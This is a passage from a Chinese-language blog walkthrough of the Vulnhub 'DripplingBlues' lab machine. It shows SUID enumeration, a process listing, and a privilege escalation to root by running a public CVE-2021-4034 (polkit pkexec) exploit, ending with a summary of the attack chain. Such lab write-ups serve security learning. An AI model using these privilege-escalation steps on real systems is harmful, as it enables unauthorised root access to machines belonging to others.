+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">44528</span> Kas <span class="m">29</span>  <span class="m">2022</span> /snap/core18/2796/usr/bin/chsh
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">75824</span> Kas <span class="m">29</span>  <span class="m">2022</span> /snap/core18/2796/usr/bin/gpasswd
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">40344</span> Kas <span class="m">29</span>  <span class="m">2022</span> /snap/core18/2796/usr/bin/newgrp
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">59640</span> Kas <span class="m">29</span>  <span class="m">2022</span> /snap/core18/2796/usr/bin/passwd
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">149080</span> Nis  <span class="m">4</span>  <span class="m">2023</span> /snap/core18/2796/usr/bin/sudo
+</span></span><span class="line"><span class="cl">-rwsr-xr-- <span class="m">1</span> root systemd-resolve <span class="m">42992</span> Eki <span class="m">25</span>  <span class="m">2022</span> /snap/core18/2796/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">436552</span> Mar <span class="m">30</span>  <span class="m">2022</span> /snap/core18/2796/usr/lib/openssh/ssh-keysign
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">43088</span> Eyl <span class="m">16</span>  <span class="m">2020</span> /snap/core18/2128/bin/mount
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">64424</span> Haz <span class="m">28</span>  <span class="m">2019</span> /snap/core18/2128/bin/ping
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">44664</span> Mar <span class="m">22</span>  <span class="m">2019</span> /snap/core18/2128/bin/su
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">26696</span> Eyl <span class="m">16</span>  <span class="m">2020</span> /snap/core18/2128/bin/umount
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">76496</span> Mar <span class="m">22</span>  <span class="m">2019</span> /snap/core18/2128/usr/bin/chfn
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">44528</span> Mar <span class="m">22</span>  <span class="m">2019</span> /snap/core18/2128/usr/bin/chsh
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">75824</span> Mar <span class="m">22</span>  <span class="m">2019</span> /snap/core18/2128/usr/bin/gpasswd
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">40344</span> Mar <span class="m">22</span>  <span class="m">2019</span> /snap/core18/2128/usr/bin/newgrp
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">59640</span> Mar <span class="m">22</span>  <span class="m">2019</span> /snap/core18/2128/usr/bin/passwd
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">149080</span> Oca <span class="m">19</span>  <span class="m">2021</span> /snap/core18/2128/usr/bin/sudo
+</span></span><span class="line"><span class="cl">-rwsr-xr-- <span class="m">1</span> root systemd-resolve <span class="m">42992</span> Haz <span class="m">11</span>  <span class="m">2020</span> /snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">436552</span> Mar  <span class="m">4</span>  <span class="m">2019</span> /snap/core18/2128/usr/lib/openssh/ssh-keysign
+</span></span><span class="line"><span class="cl">-rwsr-xr-- <span class="m">1</span> root dip <span class="m">395144</span> Tem <span class="m">23</span>  <span class="m">2020</span> /usr/sbin/pppd
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">31032</span> Şub <span class="m">21</span>  <span class="m">2022</span> /usr/bin/pkexec
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">67816</span> Şub  <span class="m">7</span>  <span class="m">2022</span> /usr/bin/su
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">166056</span> Nis  <span class="m">4</span>  <span class="m">2023</span> /usr/bin/sudo
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">39144</span> Şub  <span class="m">7</span>  <span class="m">2022</span> /usr/bin/umount
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">14728</span> Eki <span class="m">27</span> 14:51 /usr/bin/vmware-user-suid-wrapper
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">85064</span> Kas <span class="m">29</span>  <span class="m">2022</span> /usr/bin/chfn
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">53040</span> Kas <span class="m">29</span>  <span class="m">2022</span> /usr/bin/chsh
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">88464</span> Kas <span class="m">29</span>  <span class="m">2022</span> /usr/bin/gpasswd
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">68208</span> Kas <span class="m">29</span>  <span class="m">2022</span> /usr/bin/passwd
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">39144</span> Mar  <span class="m">7</span>  <span class="m">2020</span> /usr/bin/fusermount
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">44784</span> Kas <span class="m">29</span>  <span class="m">2022</span> /usr/bin/newgrp
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">55528</span> Şub  <span class="m">7</span>  <span class="m">2022</span> /usr/bin/mount
+</span></span><span class="line"><span class="cl">-rwsr-xr-- <span class="m">1</span> root messagebus <span class="m">51344</span> Eki <span class="m">25</span>  <span class="m">2022</span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class="line"><span class="cl">-rwsr-sr-x <span class="m">1</span> root root <span class="m">14488</span> Eki <span class="m">23</span> 19:31 /usr/lib/xorg/Xorg.wrap
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">22840</span> Şub <span class="m">21</span>  <span class="m">2022</span> /usr/lib/policykit-1/polkit-agent-helper-1
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">146888</span> May <span class="m">29</span> 15:09 /usr/lib/snapd/snap-confine
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">14488</span> Tem  <span class="m">8</span>  <span class="m">2019</span> /usr/lib/eject/dmcrypt-get-device
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">473576</span> Ağu  <span class="m">5</span> 01:02 /usr/lib/openssh/ssh-keysign
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在进程信息中发现了polkitd进程：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">thugger@drippingblues:~$ ps -ef
+</span></span><span class="line"><span class="cl">... ...
+</span></span><span class="line"><span class="cl">root       <span class="m">19330</span>       <span class="m">1</span>  <span class="m">0</span> 05:04 ?        00:00:00 /usr/sbin/cupsd -l
+</span></span><span class="line"><span class="cl">root       <span class="m">29599</span>       <span class="m">1</span>  <span class="m">0</span> 05:06 ?        00:00:00 /usr/lib/policykit-1/polkitd --no-debug
+</span></span><span class="line"><span class="cl">root       <span class="m">29605</span>       <span class="m">1</span>  <span class="m">0</span> 05:06 ?        00:00:00 /usr/sbin/ModemManager --filter-policy<span class="o">=</span>strict
+</span></span><span class="line"><span class="cl">... ...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>那就直接用polkitd进行提权。使用sftp上传<a href="https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py" target="_blank" rel="noopener noreffer">CVE-2021-4034-exp</a>并执行进行提权:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-SHELL" data-lang="SHELL"><span class="line"><span class="cl">thugger@drippingblues:~$ python3 cve-2021-4034.py
+</span></span><span class="line"><span class="cl"><span class="c1"># id</span>
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1001<span class="o">(</span>thugger<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ls /root</span>
+</span></span><span class="line"><span class="cl">root.txt
+</span></span><span class="line"><span class="cl"><span class="c1"># cat /root/root.txt</span>
+</span></span><span class="line"><span class="cl">78CE377EF7F10FF0EDCA63DD60EE63B8#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个md5进行碰撞没有发现结果。</p>
+<p>没有其他东西了，应该也就到此为止了。</p>
+<h2 id="notes">Notes</h2>
+<h3 id="思路梳理">思路梳理</h3>
+<p>url parameters fuzz &ndash;&gt; robots.txt get file info &ndash;&gt; get password &ndash;&gt;  login ssh &ndash;&gt; polkit privilege escalation</p>
+<h3 id="cve-2021-3560">CVE-2021-3560</h3>
+<p>CVE-2021-3560也是一个polkit常用的提权漏洞，但是在本次的测试中一直失败。</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2023-11-08</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://www.v4ler1an.com/2023/11/vulnhub_drippingblues/" data-title="Vulnhub Drippingblues" data-via="@YaoyaoShaw" data-hashtags="Vulnhub"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://www.v4ler1an.com/2023/11/vulnhub_drippingblues/" data-hashtag="Vulnhub"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://www.v4ler1an.com/2023/11/vulnhub_drippingblues/" data-title="Vulnhub Drippingblues"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://www.v4ler1an.com/2023/11/vulnhub_drippingblues/" data-title="Vulnhub Drippingblues"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.v4ler1an.com/2023/11/vulnhub_drippingblues/" data-title="Vulnhub Drippingblues"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/vulnhub/">Vulnhub</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2023/11/vulnhub_ica/" class="prev" rel="prev" title="Vulnhub ICA 1"><i class="fas fa-angle-left fa-fw"></i>Vulnhub ICA 1</a></div>
+</div>
+<div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
+            </noscript><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Something just like this.</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://www.v4ler1an.com" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/css/lightgallery.min.css"><script type="text/javascript" src="https://.disqus.com/embed.js" defer></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.2.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.2.0/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"valine":{"appId":"OGG2bwJUUrIOs4sAfU87yE6d-gzGzoHsz","appKey":"vOzsADf7YdkMoNXlgShAFepl","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"zh-cn","pageSize":10,"placeholder":"人世纷乱，出入平安。","recordIP":true,"visitor":true}},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
